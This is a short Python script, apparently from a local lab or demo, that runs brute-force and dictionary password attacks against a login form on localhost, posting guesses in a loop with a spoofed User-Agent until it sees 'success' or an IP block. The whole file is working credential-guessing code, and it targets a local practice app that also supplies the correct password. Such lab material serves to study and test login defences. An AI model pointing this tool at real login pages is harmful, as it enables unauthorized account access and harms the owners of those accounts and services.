#!/usr/bin/env python3

' Performs brute-force attacks against the target '

import sys, time, itertools
import requests
from flask_app import var

try:
    if sys.argv[1].startswith('d'):
        method = 'dictionary'
    else:
        method = 'brute-force'
except:
    method = 'brute-force'

url = 'http://localhost:8080/'

print(url[7:-1])
data = {
    'email': var.email,  # imported from flask_app
    'password': ''
}
sess = requests.Session()
sess.headers['User-Agent'] = 'Mozilla'
correct_password = var.password


def try_password(trial=[]):
    ' Send POST request attempt with password '
    try:
        data['password'] = ''.join(trial)
        print('try:', data['password'])
        res = sess.post(url, data=data)
        if 'success' in res.text:  # if brute-force successful
            return 'Success'
        elif 'block' in res.text:  # IP is blocked by server
            return 'IP blocked'
    except Exception:
        pass  # if fail to post, retry
    return ''  # empty string if failed


def brute_force():
    ' Perform brute-force attack '
    start_text = 'abcdefghij'  # text for first attempt
    length = len(start_text)  # how many char in password
    generator = itertools.combinations_with_replacement(start_text, length)
    for password in generator:
        res = try_password(password)
        if res:  # if there is response, stop attack
            print(res)
            break
        time.sleep(0.5)  # wait for 1 second before next attempt


def dictionary_attack():
    ' Perform dictionary attack using a dictionary file '
    with open('dictionary.txt') as file:
        for password in file: 
            password = password.replace('\n', '')
            res = try_password(password)
            if res:  # if there is response, stop attack
                print(res)
                break
            time.sleep(0.5)  # wait for 1 second before next attempt


if __name__ == '__main__':
    if method == 'brute-force':
        brute_force()
    else:
        dictionary_attack()
